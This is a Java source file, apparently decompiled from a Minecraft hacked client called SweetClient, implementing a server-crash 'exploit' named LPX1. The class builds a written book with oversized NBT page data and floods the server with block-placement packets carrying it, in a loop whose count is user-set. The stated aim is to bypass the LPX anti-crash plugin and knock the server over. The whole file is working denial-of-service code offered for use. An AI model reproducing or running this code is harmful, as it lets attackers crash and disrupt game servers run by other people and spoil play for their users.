package SweetClient.exploits.impl;

import SweetClient.exploits.Exploit;
import SweetClient.exploits.ExploitInfo;
import SweetClient.helpers.ChatHelper;
import SweetClient.mods.notifications.Notification;
import SweetClient.mods.notifications.NotificationManager;
import SweetClient.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

@ExploitInfo(
   name = "LPX1"
)
public class CrashLPX1 extends Exploit {
   @Override
   public void execute(Object... var1) {
      int var2 = var1[0];
      NBTTagCompound var3 = new NBTTagCompound();
      NBTTagList var4 = new NBTTagList();

      for(byte var5 = 0; var5 < 5; ++var5) {
         var4.appendTag(new NBTTagString("L P X   G O T   B Y P A S S E D"));
      }

      var3.setString("author", mc.thePlayer.getName());
      var3.setString("title", "SweetClient");
      var3.setByte("resolved", (byte)1);
      var3.setTag("pages", var4);
      ItemStack var10 = new ItemStack(Items.writable_book);
      var10.setTagCompound(var3);
      PacketBuffer var6 = new PacketBuffer(Unpooled.buffer());
      var6.writeItemStackToBuffer(var10);
      long var7 = System.currentTimeMillis();
      NotificationManager.show(new Notification(NotificationType.INFO, "SweetClient", "LPX has left the game!", 4));
      ChatHelper.printMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), var1[0]));

      for(int var9 = 0; var9 < var2; ++var9) {
         Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 0.0, Minecraft.getMinecraft().thePlayer.posZ), 2, var10, 0.0F, 0.0F, 0.0F));
      }

      ChatHelper.printMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - var7));
   }
}
